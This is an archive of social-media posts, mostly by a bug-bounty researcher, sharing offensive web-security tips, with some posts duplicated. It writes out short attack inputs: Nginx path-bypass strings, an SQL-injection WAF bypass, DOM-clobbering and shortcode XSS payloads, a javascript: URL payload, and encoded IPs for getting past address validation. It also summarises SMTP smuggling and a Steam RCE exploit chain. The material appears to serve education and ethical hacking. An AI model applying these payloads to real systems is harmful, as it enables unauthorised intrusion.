- Metrics (at fetch): not returned

> We just dropped some research and used our hackbot to take it further. Read and go bypass some WAFs 🚨
>
> Congrats @s3np41k1r1t0 for the great research 🔥 https://twitter.com/ethiack/status/1952382056748724418

**Links in post:** https://twitter.com/ethiack/status/1952382056748724418

**Quoted post (full text):**

    #### Quoted post — @1494707118712184832 — 2025-08-04 14:52 UTC (2025-08-04 15:52 WAT)
    
    - URL: https://x.com/1494707118712184832/status/1952382056748724418
    - Metrics (at fetch): not returned
    
    > What happens when a WAF blocks every XSS payload you throw at it? You get creative.
    >
    > 🔗 Read the full blog post: https://blog.ethiack.com/blog/bypassing-wafs-for-fun-and-js-injection-with-parameter-pollution
    
    **Links in post:** https://blog.ethiack.com/blog/bypassing-wafs-for-fun-and-js-injection-with-parameter-pollution
    


---

## 2025-07-31 · Post · If you're learning about vibe hacking, here's a cool article demonstrating how @mattrkeeley used AI 


Tags (automatic): AI-assisted hunting


### Post — @0xacb — 2025-07-31 09:07 UTC (2025-07-31 10:07 WAT)

- URL: https://x.com/0xacb/status/1950845742584676733
- Metrics (at fetch): not returned

> If you're learning about vibe hacking, here's a cool article demonstrating how @mattrkeeley used AI to create a working exploit for CVE-2025-32433 before any public PoCs existed!
>
> Worth a read 👇
> https://platformsecurity.com/blog/CVE-2025-32433-poc [pic.x.com/gVNhYNLC2M]

**Media:**
- photo: https://pbs.twimg.com/media/GxLL3HdWQAMsBY7.jpg — no alt text provided by author

**Links in post:** https://platformsecurity.com/blog/CVE-2025-32433-poc


---

## 2025-07-21 · Post · Ready to explore how AI is transforming Ethical Hacking?


Tags (automatic): AI-assisted hunting


### Post — @0xacb — 2025-07-21 08:07 UTC (2025-07-21 09:07 WAT)

- URL: https://x.com/0xacb/status/1947206869220479361
- Metrics (at fetch): not returned

> Ready to explore how AI is transforming Ethical Hacking?
>
> We've put together some introductory hands-on examples including:
>
> 🔍 Recon & Discovery
> Contextual subdomain enum, screenshot analysis, and content discovery
>
> ⚡ Exploit Development
> Automated vulnerability detection
>
> 🤖 Hackbots
> Using and extending open-source AI agents, leveraging Burp AI
>
> 🧠 Integrations & Plugins
> MCP servers for Burp Suite and Ghidra, Caido Shift Plugin and custom tool orchestration
>
> 🏆 CTF Challenges
> 3 simple scenarios to test your skills
>
> This repository contains a workshop guide, educational tools and scripts for learning how AI can be applied in offensive security.
>
> Check it out: https://github.com/ethiack/ai4eh

**Media:**
- photo: https://pbs.twimg.com/media/GwXeNgQXQAAvtkJ.jpg — no alt text provided by author

**Links in post:** https://github.com/ethiack/ai4eh


---

## 2025-07-18 · Post · Love the nowafpls Burp extension by @assetnote to bypass WAFs but using Caido?


### Post — @0xacb — 2025-07-18 09:37 UTC (2025-07-18 10:37 WAT)

- URL: https://x.com/0xacb/status/1946142252234952709
- Metrics (at fetch): not returned

> Love the nowafpls Burp extension by @assetnote to bypass WAFs but using Caido?
>
> @Rhynorater recreated it for @CaidoIO.
>
> Check it out 👇
> https://gist.github.com/Rhynorater/ace68d4976357ca0937cb4669f303306

**Links in post:** https://gist.github.com/Rhynorater/ace68d4976357ca0937cb4669f303306


---

## 2025-07-15 · Post · Vibe coded a simple PHP app using Claude code.


Tags (automatic): AI-assisted hunting


### Post — @0xacb — 2025-07-15 08:37 UTC (2025-07-15 09:37 WAT)

- URL: https://x.com/0xacb/status/1945040109906149402
- Metrics (at fetch): not returned

> Vibe coded a simple PHP app using Claude code.
>
> Path traversal is prevented via basename functions.
>
> Can you still exploit it?
>
> A shell is waiting for you at https://ai4eh.ethiack.ninja [pic.x.com/ckNRPI1ZkO]

**Media:**
- video:  — no alt text provided by author

**Links in post:** https://ai4eh.ethiack.ninja


---

## 2025-07-10 · Post · PHP functions like file() don’t display content, but that doesn’t mean they’re secure.


### Post — @0xacb — 2025-07-10 11:16 UTC (2025-07-10 12:16 WAT)

- URL: https://x.com/0xacb/status/1943268055112458661
- Metrics (at fetch): not returned

> PHP functions like file() don’t display content, but that doesn’t mean they’re secure.
>
> This @synacktiv research explores how php://filter can turn these silent reads into file leaks using error-based oracles.
>
> 💥 Exponential encoding triggers memory limit errors
> 💥 Hex checks via dechunk determine initial file bytes
> 💥 Chained encodings reorder bytes to extract any position
>
> Take a look: https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle

**Links in post:** https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle


---

## 2025-07-10 · Post · PHP functions like file() don’t display content, but that doesn’t mean they’re secure.


### Post — @0xacb — 2025-07-10 11:16 UTC (2025-07-10 12:16 WAT)

- URL: https://x.com/0xacb/status/1943267966709055687
- Metrics (at fetch): not returned

> PHP functions like file() don’t display content, but that doesn’t mean they’re secure.
>
> This @synacktiv research explores how php://filter can turn these silent reads into file leaks using error-based oracles
>
> 💥 Exponential encoding triggers memory limit errors
> 💥 Hex checks via dechunk determine initial file bytes
> 💥 Chained encodings reorder bytes to extract any position
>
> Take a look: https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle

**Links in post:** https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle


---

## 2025-07-10 · Post · PHP functions like file() don’t display content, but that doesn’t mean they’re secure.


### Post — @0xacb — 2025-07-10 11:15 UTC (2025-07-10 12:15 WAT)

- URL: https://x.com/0xacb/status/1943267863227257042
- Metrics (at fetch): not returned

> PHP functions like file() don’t display content, but that doesn’t mean they’re secure.
>
> This @synacktiv research explores how php://filter can turn these silent reads into file leaks using error-based oracles.
>
> 💥 Exponential encoding triggers memory limit errors
> 💥 Hex checks via dechunk determine initial file bytes
> 💥 Chained encodings reorder bytes to extract any position
>
> Take a look: https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle

**Links in post:** https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle


---

## 2025-07-10 · Post · PHP functions like file() don’t display content, but that doesn’t mean they’re secure.


### Post — @0xacb — 2025-07-10 11:07 UTC (2025-07-10 12:07 WAT)

- URL: https://x.com/0xacb/status/1943265772882513983
- Metrics (at fetch): not returned

> PHP functions like file() don’t display content, but that doesn’t mean they’re secure.
>
> This @synacktiv research explores how php://filter can turn these silent reads into file leaks using error-based oracles.
>
> 💥 Exponential encoding triggers memory limit errors
> 💥 Hex checks via dechunk determine initial file bytes
> 💥 Chained encodings reorder bytes to extract any position
>
> Take a look: https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle

**Links in post:** https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle


---

## 2025-07-08 · Post · SMTP expects messages to end with the sequence \r\n.\r\n.


Tags (automatic): Request smuggling / desync


### Post — @0xacb — 2025-07-08 08:36 UTC (2025-07-08 09:36 WAT)

- URL: https://x.com/0xacb/status/1942503051237167262
- Metrics (at fetch): not returned

> SMTP expects messages to end with the sequence \r\n.\r\n.
>
> But not all servers agree.
>
> Some interpret \n.\n, others accept exotic sequences like \r.\r. If an outbound server ignores a delimiter and the inbound recognizes it, you get a context break.
>
> That’s SMTP smuggling.
>
> By crafting malformed end-of-data sequences, you can:
> 💥 Break out of the message body.
> 💥 Inject new SMTP commands.
> 💥 Send spoofed emails with full SPF/DKIM/DMARC alignment.
>
> This works because authentication is decoupled from message handling. Once you’re through a trusted relay (e.g., GMX, Exchange Online), you're inside.
>
> The research shows:
> 💥 GMX relays \n.\n and \n.\r\n unfiltered.
> 💥 Cisco Secure Email accepts \r.\r as end-of-data.
> 💥 Outlook uses BDAT, but falls back to DATA if CHUNKING isn’t supported.
>
> It’s basically like HTTP request smuggling but at the SMTP level. 
>
> Read the full research paper by @timolongin here 👇 https://sec-consult.com/blog/detail/smtp-smuggling-spoofing-e-mails-worldwide

**Media:**
- photo: https://pbs.twimg.com/media/GvUoOdMWUAA1XCU.jpg — no alt text provided by author

**Links in post:** https://sec-consult.com/blog/detail/smtp-smuggling-spoofing-e-mails-worldwide


---

## 2025-07-08 · Post · SMTP expects messages to end with the sequence \r\n.\r\n.


Tags (automatic): Request smuggling / desync


### Post — @0xacb — 2025-07-08 08:27 UTC (2025-07-08 09:27 WAT)

- URL: https://x.com/0xacb/status/1942500727080833366
- Metrics (at fetch): not returned

> SMTP expects messages to end with the sequence \r\n.\r\n.
>
> But not all servers agree.
>
> Some interpret \n.\n, others accept exotic sequences like \r.\r. If an outbound server ignores a delimiter and the inbound recognizes it, you get a context break.
>
> That’s SMTP smuggling.
>
> By crafting malformed end-of-data sequences, you can:
> 💥 Break out of the message body.
> 💥 Inject new SMTP commands.
> 💥 Send spoofed emails with full SPF/DKIM/DMARC alignment.
>
> This works because authentication is decoupled from message handling. Once you’re through a trusted relay (e.g., GMX, Exchange Online), you're inside.
>
> The research shows:
> 💥 GMX relays \n.\n and \n.\r\n unfiltered.
> 💥 Cisco Secure Email accepts \r.\r as end-of-data.
> 💥 Outlook uses BDAT, but falls back to DATA if CHUNKING isn’t supported.
>
> It’s basically like HTTP request smuggling but at the SMTP level. 
>
> Read the full research paper by @timolongin here 👇 https://sec-consult.com/blog/detail/smtp-smuggling-spoofing-e-mails-worldwide

**Links in post:** https://sec-consult.com/blog/detail/smtp-smuggling-spoofing-e-mails-worldwide


---

## 2025-07-07 · Post · Most open redirects are low-severity or N/A.


Tags (automatic): XSS, SSRF, OAuth


### Post — @0xacb — 2025-07-07 09:37 UTC (2025-07-07 10:37 WAT)

- URL: https://x.com/0xacb/status/1942155984899559836
- Metrics (at fetch): not returned

> Most open redirects are low-severity or N/A.
>
> But used creatively, they can become high impact gadgets.
>
> Here are 4 ways to show impact with open redirects:
>
> 1️⃣ SSRF Chaining
>
> Use it to bypass filters where the domain is allow-listed.
>
> 2️⃣ OAuth Abuse
>
> Exploit it in auth flows to leak access tokens and sensitive parameters.
>
> 3️⃣ Iframe Embedding + postMessage
>
> Embed your attacker-controlled redirect page via iframe for postMessage exploits.
>
> 4️⃣ Client-side Path Traversal
>
> Inject ../../ in dynamic fetch or iframe src to hit the redirect and potentially trigger XSS.
>
> Loads more gadgets like this in this @ctbbpodcast HackerNotes: https://blog.criticalthinkingpodcast.io/p/useful-gadgets-when-bug-bounty-hunting

**Media:**
- photo: https://pbs.twimg.com/media/GvPsknJW8AAn5-I.jpg — no alt text provided by author

**Links in post:** https://blog.criticalthinkingpodcast.io/p/useful-gadgets-when-bug-bounty-hunting


---

## 2025-07-02 · Post · Nginx normalizes paths (/../, %2e, etc.) before applying access rules like: location = /admin { deny


### Post — @0xacb — 2025-07-02 08:21 UTC (2025-07-02 09:21 WAT)

- URL: https://x.com/0xacb/status/1940325041834471716
- Metrics (at fetch): not returned

> Nginx normalizes paths (/../, %2e, etc.) before applying access rules like: location = /admin { deny all; }
>
> But backends like Node.js or PHP handle decoding again, and differently.
>
> Requesting /;admin or /admin%2f..%2f might bypass Nginx’s block, but get normalized to /admin by the backend.
>
> Result? The forbidden route now becomes accessible.
>
> The root cause:
> 💥 Nginx applies ACLs pre-backend.
> 💥 Backends apply their own parsing.
> 💥 Inconsistencies = bypass.
>
> Exploits include:
> 💥 Prefixing with special characters (;, @, %00)
> 💥 Over-encoded paths (%2f, %252e)
> 💥 Inserting full URLs or alternate syntax to confuse proxies
>
> Some real examples:
>
> Node.js: Ignores \xa0, \x09, \x0c
> 💥 /admin\xa0 → Blocked by Nginx, matched by Express
>
> Flask: Strips \x85, \xa0, \x1f ...
> 💥 /admin\x85 → Bypasses Nginx’s location blocks
>
> Spring Boot: Ignores \x09, ;
> 💥 /admin; or /admin\x09 → Access granted
>
> PHP-FPM:
> 💥 /admin.php/index.php → Nginx blocks /admin.php, but PHP parses only the first .php
>
> AWS WAF: Line folding with \x09 splits headers
> 💥 X-Query: \r\n\t'or'1'='1'-- → Bypasses WAF, interpreted by Node.js (fixed in 2022)
>
> The full research paper by Rafael da Costa Santos is packed full of juicy details, super cool stuff. https://blog.bugport.net/exploiting-http-parsers-inconsistencies

**Media:**
- photo: https://pbs.twimg.com/media/Gu1rN9EWwAAkGVx.jpg — no alt text provided by author

**Links in post:** https://blog.bugport.net/exploiting-http-parsers-inconsistencies


---

## 2025-06-27 · Post · Can you hack a vibe coded PHP app? Yes. Can you use AI to hack the same app? Yes.


Tags (automatic): AI-assisted hunting


### Post — @0xacb — 2025-06-27 17:35 UTC (2025-06-27 18:35 WAT)

- URL: https://x.com/0xacb/status/1938652455538987352
- Metrics (at fetch): not returned

> Can you hack a vibe coded PHP app? Yes. Can you use AI to hack the same app? Yes.
>
> Just dropped our workshop on AI for Ethical Hacking.
>
> Full materials 👇
>
> https://github.com/ethiack/ai4eh/blob/main/ai-for-ethical-hacking.pdf
>
> Blog post: https://blog.ethiack.com/blog/dont-fear-the-ai-reaper-using-llms-to-hack-better-and-faster [pic.x.com/5uXrKiuCAV]

**Media:**
- photo: https://pbs.twimg.com/media/Gud4tG0WQAA_X7p.jpg — no alt text provided by author

**Links in post:** https://github.com/ethiack/ai4eh/blob/main/ai-for-ethical-hacking.pdf, https://blog.ethiack.com/blog/dont-fear-the-ai-reaper-using-llms-to-hack-better-and-faster


---

## 2025-06-16 · Post · I like to bypass XSS filters and sanitizers, so I keep forgetting to test for CSS exfiltration when 


Tags (automatic): XSS


### Post — @0xacb — 2025-06-16 14:48 UTC (2025-06-16 15:48 WAT)

- URL: https://x.com/0xacb/status/1934624097985515836
- Metrics (at fetch): not returned

> I like to bypass XSS filters and sanitizers, so I keep forgetting to test for CSS exfiltration when I have HTML injection.
>
> This reminded me of the sic tool by @d0nutptr from a Singapore LHE, but there's also a cool list from @PortSwigger 👇
>
> https://github.com/PortSwigger/css-exfiltration

**Links in post:** https://github.com/PortSwigger/css-exfiltration


---

## 2025-06-16 · Post · I like to bypass XSS filters and sanitizers, so I keep forgetting to test for CSS exfiltration when 


Tags (automatic): XSS


### Post — @0xacb — 2025-06-16 14:43 UTC (2025-06-16 15:43 WAT)

- URL: https://x.com/0xacb/status/1934622825815462219
- Metrics (at fetch): not returned

> I like to bypass XSS filters and sanitizers, so I keep forgetting to test for CSS exfiltration when I have HTML injection.
>
> This reminded me of the https://github.com/d0nutptr/sic tool by @d0nutptr from a Singapore LHE, but there's also a cool list from @PortSwigger 👇
>
> https://github.com/PortSwigger/css-exfiltration

**Links in post:** https://github.com/d0nutptr/sic, https://github.com/PortSwigger/css-exfiltration


---

## 2025-06-11 · Post · This is how DOM clobbering works.


Tags (automatic): XSS


### Post — @0xacb — 2025-06-11 08:51 UTC (2025-06-11 09:51 WAT)

- URL: https://x.com/0xacb/status/1932722419380228270
- Metrics (at fetch): not returned

> This is how DOM clobbering works.
>
> When you create an element with an id, the browser automatically creates a global variable for that ID:
>
> <a id="foo"></a>
>
> Now http://window.foo points to that single element.
>
> But when you create multiple elements with the same id:
>
> <a id="foo"></a>
> <a id="foo"></a>
>
> Now http://window.foo becomes an HTMLCollection, not a single element.
>
> Add a name attribute:
>
> <a id="foo" name="bar" href="..."></a>
>
> And http://window.foo.bar now points to that element (works in Chromium/WebKit browsers, but not Firefox).
>
> Now combine that with a common JS pattern like:
>
> var someObject = window.someObject || {};
>
> This is meant to provide a fallback if the global doesn't exist. However, if window.someObject has been clobbered by injected HTML, the fallback silently trusts a DOM object instead of a real JS object.
>
> Now imagine this JS logic:
>
> let imgSrc = someObject.avatar;
>
> If an attacker clobbered someObject.avatar with:
>
> <a id=someObject></a>
> <a id=someObject name=avatar href='cid:"onerror=alert(1)//'></a>
>
> If HTML is set via innerHTML or similar, then this could render as:
>
> <img src="cid:" onerror="alert(1)//"">
>
> Which triggers XSS! Here's a quick walkthrough of the DOM clobbering @WebSecAcademy lab👇
>
> Try this lab: https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering

**Media:**
- video:  — no alt text provided by author

**Links in post:** http://window.foo, http://window.foo.bar, https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering


---

## 2025-06-10 · Post · 10 ways to encode IPs to bypass validations 👇


### Post — @0xacb — 2025-06-10 17:08 UTC (2025-06-10 18:08 WAT)

- URL: https://x.com/0xacb/status/1932484945877839880
- Metrics (at fetch): not returned

> 10 ways to encode IPs to bypass validations 👇
>
> 8.8.1028 → Partial Decimal (Class B)
> Combines the 3rd and 4th octets: 4 × 256 + 4 = 1028
>
> 8.525316 → Partial Decimal (Class A)
> Combines the last three octets into one decimal number
>
> 0x08.8.004.004 → Mixed Encoding
> Hexadecimal + Decimal + Octal (segment by segment)
>
> 0x08.0x08.004.004 → Double Hex + Octal
> Two segments in hex, two in octal
>
> 0x08.010.4.4 → Hex + Octal + Decimal Mix
>
> 134743044 → Single Decimal
> Full 32-bit integer representation of the IP
>
> 0x08080404 → Full Hexadecimal IP
> Entire IP encoded as a single hex literal
>
> 010.010.004.004 → All Octal
> Each segment padded with 0 to force octal interpretation
>
> 0x8.0x8.0x4.0x4 → Hex per Segment
> All four octets encoded individually in hex
>
> 8.8.0x404 → Partial Hex (Class B)
> Last segment in hex: 0x404 = 1028
>
> You can also use unicode digits instead!
>
> These won't resolve with curl/ping etc but may still work with other libraries:
>
> ⑧.⑧.④.④ ← Circled unicode digits
> ８.８.４.４ ← Fullwidth unicode digits
> 𝟠.𝟠.𝟜.𝟜 ← Math unicode digits

**Media:**
- photo: https://pbs.twimg.com/media/GtGQ0ClXEAAT6oQ.jpg — no alt text provided by author


---

## 2025-06-07 · Post · Exploiting slash/backslash mismatch to trigger cache poisoning.


Tags (automatic): Platform: HackerOne


### Post — @0xacb — 2025-06-07 09:07 UTC (2025-06-07 10:07 WAT)

- URL: https://x.com/0xacb/status/1931276762224165322
- Metrics (at fetch): not returned

> Exploiting slash/backslash mismatch to trigger cache poisoning.
>
> This one-liner bug by @bassemsadaqah led to a CDN-wide DoS on Shopify and is a great example of how simple tricks can lead to impactful issues in mature organizations.
>
> Full report here 👇
> https://hackerone.com/reports/1695604

**Links in post:** https://hackerone.com/reports/1695604


---

## 2025-06-05 · Post · Once you’ve found a source of user input, the next question is:


Tags (automatic): XSS, SSRF, RCE


### Post — @0xacb — 2025-06-05 08:46 UTC (2025-06-05 09:46 WAT)

- URL: https://x.com/0xacb/status/1930546717474041922
- Metrics (at fetch): not returned

> Once you’ve found a source of user input, the next question is:
>
> Where does that input land?
>
> That’s your sink. And WordPress plugins expose a ton of them. 
>
> Here are 9 to look for 👇
>
> 1. update_option()
>
> - Stores global config like default roles, site settings, API keys.
> - Set the default role to admin + enable registration = privilege escalation.
> - API key fields are often unescaped on output which can result in Stored XSS on admin visit.
>
> 2. add_post(), update_post(), delete_post(), trash_post()
>
> - Used for creating/updating content.
> - If input flows here unescaped leading to Stored XSS
> - Combine with CSRF to trick admins into triggering XSS → edit plugin → RCE.
>
> 3. update_user_meta()
>
> - Controls user roles, capabilities, custom fields.
> - Found often in membership plugins.
> - If you can update arbitrary meta you may be about escalate to admin.
>
> 4. move_uploaded_file() / unzip_file()
>
> - Used in file upload and extraction flows.
> - If MIME/type checks are weak → zip slip, double extension tricks, or web shell uploads.
> - Look for plugins that re-implement these functions manually.
>
> 5. wp_remote_get()
>
> - Makes outbound HTTP requests.
> - Great SSRF sink especially in cloud environments
>
> 6. wp_handle_upload()
>
> - File upload handler with MIME + extension validation.
> - Safe by default unless the plugin overrides it (which many do).
>
> 7. is_file(), file_exists(), file_get_contents()
>
> - File checks and reads.
> - When combined with PHAR-based deserialization, these may become RCE triggers.
>
> 8. _e()
>
> - Used for echoing translated strings.
> - Combine this with file uploads of poisoned translation files = Stored XSS.
>
> 9. $_REQUEST + request_page
>
> - Mixing GET and POST inputs gives variable overloading.
> - If a plugin uses $_REQUEST['page'] and echoes it, and you control both GET + POST, you may get Stored XSS.
>
> Shoutout to @ctbbpodcast! 🔥

**Media:**
- photo: https://pbs.twimg.com/media/GsquASlXIAAaLER.jpg — no alt text provided by author


---

## 2025-06-03 · Post · Many WordPress devs trust wp_kses_post() to sanitize post content and assume shortcode attributes ar


Tags (automatic): XSS


### Post — @0xacb — 2025-06-03 10:01 UTC (2025-06-03 11:01 WAT)

- URL: https://x.com/0xacb/status/1929840981290971441
- Metrics (at fetch): not returned

> Many WordPress devs trust wp_kses_post() to sanitize post content and assume shortcode attributes are safe too.
>
> But they’re not.
>
> wp_kses_post() only sanitizes FULL HTML tags, not partial content or attribute values.
>
> Shortcodes let users add dynamic functionality inside posts, like this: [shortcode_name attribute1="value1"].
>
> This tells WordPress to run a plugin’s code, insert the result and customize how the output is rendered.
>
> But if the plugin outputs the attribute value directly into HTML without escaping it, the input can become executable which means [shortcode_name attribute1='" onmouseover="alert(1)"'] would be rendered into <a class="" onmouseover="alert(1)" href="#">Click</a>, resulting in a Stored XSS!
>
> Shoutout to @ramuelgall and @ctbbpodcast for these tips! 🙏
>
> More info at 👉 https://blog.criticalthinkingpodcast.io/p/hn-55-wordpress-plugins-common-design-flaws-code-review-methodology

**Media:**
- photo: https://pbs.twimg.com/media/GsgsJJ9XkAAXw3v.jpg — no alt text provided by author

**Links in post:** https://blog.criticalthinkingpodcast.io/p/hn-55-wordpress-plugins-common-design-flaws-code-review-methodology


---

## 2025-05-20 · Post · Automation handles the known. Humans uncover the new.


### Post — @0xacb — 2025-05-20 08:33 UTC (2025-05-20 09:33 WAT)

- URL: https://x.com/0xacb/status/1924745243448037674
- Metrics (at fetch): not returned

> Automation handles the known. Humans uncover the new.
>
> Here are 6 ways to manually find new attack vectors 👇
>
> 1️⃣ Redefining the Impossible - "You can't"
>
> Search documentation for “X cannot do Y” restrictions. These statements often highlight strong assumptions and logic. Use them to target role misconfigurations, bypasses, and potential enforcements.
>
> 2️⃣ Bypassing Paywalls
>
> Buy access once. Analyze which API calls enable or use paid features. Then reuse those calls with a free account. Some apps rely on frontend checks only. While some programs may not consider this valid, financial impact is a valid security issue - it affects the integrity of the application and the business itself.
>
> 3️⃣ What's that Library?
>
> Found an interesting endpoint? Cool. Fuzz it to make the backend return some errors. Copy and paste parts of the exact error on GitHub to figure out what library the target may be using. Go deep and try to exploit it, while looking for recently closed issues or potential vulnerabilities in the code (or dependencies).
>
> 4️⃣ Make the UI go Crazy
>
> Trigger UI states that developers never expected to exist, display hidden elements and don't just replace "false" with "true". Change properties progressively from "false" to "true" in the response body or replace other values, e.g. change your balance or change your subscription code, while analyzing how the app behaves.
>
> 5️⃣ Using the App as a Normal User
>
> Focus on using the app from the user perspective. Navigate it manually while your proxy logs requests. Start writing ideas, e.g. it would be cool to find a way to sneak HTML in my account name, it's blocked in the signup flow but what about profile edit? And the API?
>
> 6️⃣ Analyzing Responses for Weird Stuff
>
> Check what the backend returns vs. what’s shown in the frontend. Redacted data (e.g. only 4 digits of a SSN) might be fully exposed via backend. Look for potential beta features or weird properties.

**Media:**
- photo: https://pbs.twimg.com/media/GrYRmN4XQAABjWy.jpg — no alt text provided by author


---

## 2025-05-13 · Post · When browsers flatten deeply nested nodes, it happens after parsing. 


### Post — @0xacb — 2025-05-13 09:02 UTC (2025-05-13 10:02 WAT)

- URL: https://x.com/0xacb/status/1922215945512038763
- Metrics (at fetch): not returned

> When browsers flatten deeply nested nodes, it happens after parsing. 
>
> That means if a <style> is pulled out of an <svg>, it still retains its SVG namespace even though it now appears outside the <svg> 🤯
>
> This creates invalid but accepted DOMs that mutate on reparse.
>
> Even <a> tags flattened from SVG into HTML bypass HTML nesting rules and stay in the tree.

**Media:**
- video: https://pbs.twimg.com/ext_tw_video_thumb/1922215931582803968/pu/img/EEuSFkBj87R3GJBG.jpg — no alt text provided by author


---

## 2025-05-05 · Post · Bug bounties ain't just web. Throwback to when @kernelpaniek and I got RCE on Steam Client via a buf


Tags (automatic): RCE, Memory corruption / native, Platform: HackerOne


### Post — @0xacb — 2025-05-05 09:02 UTC (2025-05-05 10:02 WAT)

- URL: https://x.com/0xacb/status/1919316709418107043
- Metrics (at fetch): not returned

> Bug bounties ain't just web. Throwback to when @kernelpaniek and I got RCE on Steam Client via a buffer overflow in Server Browser 🚨
>
> Root Cause:
> 🎯 Wide-char conversion without boundary checks inside serverbrowser.dll leading to stack corruption
>
> Exploit:
> 🪲 Crafted oversized Unicode player name payload
> 🪲 Unicode-compatible ROP chain built from Steam.exe gadgets
> 🪲 Dynamic call to VirtualProtect to mark stack executable
> 🪲 Shellcode launches cmd.exe
>
> Impact:
> 💥 Remote code execution (RCE) on Windows
> 🤔 Partial control on Linux (2 bytes of EIP)
> 🤔 SIGABRT on macOS (due to canaries)
>
> Delivery:
> 📦 User tries to connect to a CS game via Steam client
> 📦 User visits malicious webpage triggering Steam protocol handler
>
> Tools:
> 🛠️ Python for UDP server and payload generation
> 🛠️ Immunity Debugger for base address retrieval
> 🛠️ Steam Server Query documentation for packet crafting
>
> Read the full report: https://hackerone.com/reports/470520

**Media:**
- photo: https://pbs.twimg.com/media/GqLIX2ZXcAAVIdr.jpg — no alt text provided by author

**Links in post:** https://hackerone.com/reports/470520


---

## 2025-04-28 · Post · Querying all DNS records of a target (or list of subdomains) with dnsX -recon flag.


### Post — @0xacb — 2025-04-28 09:37 UTC (2025-04-28 10:37 WAT)

- URL: https://x.com/0xacb/status/1916788947365093603
- Metrics (at fetch): not returned

> Querying all DNS records of a target (or list of subdomains) with dnsX -recon flag.
>
> Sometimes you can find extra subs and even more interesting records to expand your info on the attack surface 👀 [pic.x.com/QEwXkHmY2h]

**Media:**
- photo: https://pbs.twimg.com/media/GpnNRc_XUAAoRuy.jpg — no alt text provided by author


---

## 2025-04-14 · Post · Black-box regex fuzzing to bypass validations with REcollpase. Just pushed a new update 👀


### Post — @0xacb — 2025-04-14 09:09 UTC (2025-04-14 10:09 WAT)

- URL: https://x.com/0xacb/status/1911708346291278310
- Metrics (at fetch): not returned

> Black-box regex fuzzing to bypass validations with REcollpase. Just pushed a new update 👀
>
> Repo: https://github.com/0xacb/recollapse [pic.x.com/v5FvRcS35l]

**Media:**
- photo: https://pbs.twimg.com/media/GofAm4NXoAA7ETl.jpg — no alt text provided by author

**Links in post:** https://github.com/0xacb/recollapse


---

## 2025-04-11 · Post · Somehow, Chrome 130+ started parsing the hostname from javascript URLs again and this can be used fo


Tags (automatic): XSS


### Post — @0xacb — 2025-04-11 09:02 UTC (2025-04-11 10:02 WAT)

- URL: https://x.com/0xacb/status/1910619377273020614
- Metrics (at fetch): not returned

> Somehow, Chrome 130+ started parsing the hostname from javascript URLs again and this can be used for a constrained XSS 🤯
>
> https://challenges.ethiack.ninja/leak-the-secret/?url=javascript://legit.ethiack.ninja/%250aalert(document.domain)//
>
> This was the second solution for the recent CTF challenge. [pic.x.com/JQxMokpydN]

**Media:**
- video: https://pbs.twimg.com/ext_tw_video_thumb/1910619314991865856/pu/img/Nwc7psLYKTcXsMM8.jpg — no alt text provided by author

**Links in post:** https://challenges.ethiack.ninja/leak-the-secret/?url=javascript://legit.ethiack.ninja/%250aalert(document.domain)//


---

## 2025-04-08 · Post · Here's a challenge. There are at least two valid solutions!


### Post — @0xacb — 2025-04-08 09:02 UTC (2025-04-08 10:02 WAT)

- URL: https://x.com/0xacb/status/1909532204914422084
- Metrics (at fetch): not returned

> Here's a challenge. There are at least two valid solutions!
>
> Solve it to discover a nice bug bounty tip!
>
> Play here 👉 https://challenges.ethiack.ninja/leak-the-secret/ [pic.x.com/qsTODF0Z2x]

**Media:**
- photo: https://pbs.twimg.com/media/GoAFawQXEAAP66w.jpg — no alt text provided by author

**Links in post:** https://challenges.ethiack.ninja/leak-the-secret/


---

## 2025-04-05 · Post · Need help writing reports?


Tags (automatic): AI-assisted hunting


### Post — @0xacb — 2025-04-05 01:06 UTC (2025-04-05 02:06 WAT)

- URL: https://x.com/0xacb/status/1908325344014192925
- Metrics (at fetch): not returned

> Need help writing reports?
>
> Check out @Jhaddix's Bounty Plz GPT ✍️
>
> Just give it a host name and a brief description of your finding and it will do the rest!
>
> (🔗 in comments) [pic.x.com/HLnFE86JXM]

**Media:**
- video: https://pbs.twimg.com/ext_tw_video_thumb/1908325310552055809/pu/img/bO73XOLZz3ciM9do.jpg — no alt text provided by author


---

## 2023-04-26 · Post · Just published a writeup for Git Arbitrary Configuration Injection (CVE-2023-29007) via @ethiack.


Tags (automatic): RCE


### Post — @0xacb — 2023-04-26 16:05 UTC (2023-04-26 17:05 WAT)

- URL: https://x.com/0xacb/status/1651256116121067522
- Metrics (at fetch): not returned

> Just published a writeup for Git Arbitrary Configuration Injection (CVE-2023-29007) via @ethiack.
>
> A simple parsing logic error could lead to arbitrary configuration injection and local code execution while running legitimate Git commands.
>
> https://blog.ethiack.com/en/blog/git-arbitrary-configuration-injection-cve-2023-29007

**Links in post:** https://blog.ethiack.com/en/blog/git-arbitrary-configuration-injection-cve-2023-29007


---

## 2019-12-21 · Post · When friends hack together amazing things just happen. Loved to play with this bug, one my favorites


### Post — @0xacb — 2019-12-21 21:58 UTC (2019-12-21 22:58 WAT)

- URL: https://x.com/0xacb/status/1208507004098142210
- Metrics (at fetch): not returned

> When friends hack together amazing things just happen. Loved to play with this bug, one my favorites of the year! Good job my friend @samwcyo https://twitter.com/samwcyo/status/1208461516674084867

**Links in post:** https://twitter.com/samwcyo/status/1208461516674084867

**Quoted post (full text):**

    #### Quoted post — @samwcyo — 2019-12-21 18:57 UTC (2019-12-21 19:57 WAT)
    
    - URL: https://x.com/samwcyo/status/1208461516674084867
    - Metrics (at fetch): bookmark 207, impression 0, like 1267, quote 23, reply 27, retweet 467
    
    > New writeup, one of my favorite bugs 🤠 -
    >
    > Filling in the Blanks: Exploiting Null Byte Buffer Overflow for a $40,000 Bounty
    >
    > https://samcurry.net/filling-in-the-blanks-exploiting-null-byte-buffer-overflow-for-a-40000-bounty/
    >
    > Featuring...
